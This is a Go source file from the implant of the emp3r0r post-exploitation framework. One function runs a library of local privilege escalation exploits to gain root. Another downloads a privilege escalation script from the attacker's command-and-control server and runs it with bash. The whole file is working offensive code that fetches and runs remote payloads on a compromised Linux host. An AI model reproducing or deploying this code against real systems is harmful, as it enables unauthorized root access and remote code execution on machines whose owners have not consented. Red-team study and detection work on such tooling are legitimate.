package agent

// build +linux

import (
	"log"
	"os/exec"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	golpe "github.com/jm33-m0/go-lpe"
)

func GetRoot() error {
	return golpe.RunAll()
}

// lpeHelper runs les and upc to suggest LPE methods
func lpeHelper(method string) string {
	log.Printf("Downloading lpe script from %s", emp3r0r_data.CCAddress+method)
	var scriptData []byte
	scriptData, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/"+method, "")
	if err != nil {
		return "LPE error: " + err.Error()
	}

	// run the script
	log.Println("Running LPE suggest")
	cmd := exec.Command("/bin/bash", "-c", string(scriptData))
	if method == "lpe_lse" {
		cmd = exec.Command("/bin/bash", "-c", string(scriptData), "-i")
	}

	outBytes, err := cmd.CombinedOutput()
	if err != nil {
		return "LPE error: " + string(outBytes)
	}

	return string(outBytes)
}
